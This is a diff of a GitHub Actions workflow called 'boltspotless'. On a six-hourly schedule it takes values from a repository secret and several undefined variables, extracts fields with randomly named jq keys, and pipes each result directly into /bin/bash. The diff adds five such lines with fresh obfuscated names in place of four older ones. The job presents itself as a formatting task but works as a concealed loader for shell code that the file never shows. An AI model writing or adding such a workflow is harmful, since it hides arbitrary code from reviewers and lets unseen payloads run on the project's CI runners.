@@ -1,22 +1,21 @@
 name: boltspotless
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 4/6 * * *'
+    - cron: '52 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: boltspotless
         env:
-          o15: ${{ secrets.o15 }}
+          rw093: ${{ secrets.rw093 }}
         run: |
-          echo $o15 | jq -r .wgt038 | /bin/bash
-          echo $rds1 | jq -r .dwsa9 | /bin/bash
-          echo $ooi9812 | jq -r .v613 | /bin/bash
-          echo $bi71834 | jq -r .m20001 | /bin/bash
+          echo $rw093 | jq -r .aazr743 | /bin/bash
+          echo $cprm31381 | jq -r .uqb3620 | /bin/bash
+          echo $sw61600 | jq -r .ocb8 | /bin/bash
+          echo $dca9597 | jq -r .wvib61888 | /bin/bash
+          echo $z857 | jq -r .yn0 | /bin/bash
 
